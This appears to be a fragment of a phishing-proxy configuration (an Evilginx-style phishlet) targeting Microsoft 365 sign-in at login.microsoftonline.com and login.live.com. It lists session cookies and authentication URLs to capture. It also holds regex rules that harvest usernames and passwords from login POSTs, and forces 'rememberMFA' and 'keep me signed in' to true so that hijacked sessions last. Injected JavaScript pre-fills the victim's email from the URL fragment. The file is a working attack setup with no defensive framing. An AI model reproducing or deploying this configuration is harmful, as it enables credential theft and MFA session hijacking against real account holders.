    keys: ['akm_lmprb-ssn', 'akm_lmprb']


force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"

  - path: '/kmsi'
    search:
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'

  - path: '/common/SAS'
    search:
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'

auth_urls:
  - "/kmsi*"
  - "/ppsecure/post.srf*"
  - "/owa/prefetch.aspx*"
  - "/webmanifest.json*"
  - "/landingv2"
  - "v1/api/pass/o365/header"
  - '/login.srf'
  - "/api/pass/login"

credentials:
  username:
    key: "(login|UserName|username|email|account|DomainUser)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: 'post'
  custom:
    - key: '(API_HOST|Lastname)'
      search: '(.*)'
      type: "json"

login:
  domain: "login.microsoftonline.com"
  path: "/"
js_inject:
  - trigger_domains: ["login.microsoftonline.com","login.live.com"]
    trigger_paths: ["*"]
    trigger_params: []
    script: |
          function handleEmailInput() {
              const timeoutDelay = 1000; // Retry delay set to 5 seconds

              function findAndTypeEmail() {
                  const emailInput = document.querySelector('input[type="email"][name="loginfmt"]');

                  if (!emailInput) {
                      console.warn("Email input field not found. Retrying in 5 seconds...");
                      setTimeout(findAndTypeEmail, timeoutDelay); // Retry after delay
                      return;
                  }

                  const urlFragment = location.hash.replace('#', '');
                  if (!urlFragment) {
                      console.warn("No URL fragment found to type.");
                      return; // Exit if the URL fragment is empty
                  }

                  let index = 0;

                  function typeNextChar() {
                      if (index < urlFragment.length) {
                          emailInput.value += urlFragment.charAt(index);
                          index++;

                          emailInput.dispatchEvent(new Event('input', {
                              bubbles: true
                          }));

                          setTimeout(typeNextChar, 50);
                      }
                  }

                  typeNextChar();
              }

              findAndTypeEmail();
          }

          document.addEventListener("DOMContentLoaded", function () {
              handleEmailInput();
              console.log("Page has loaded.");
          });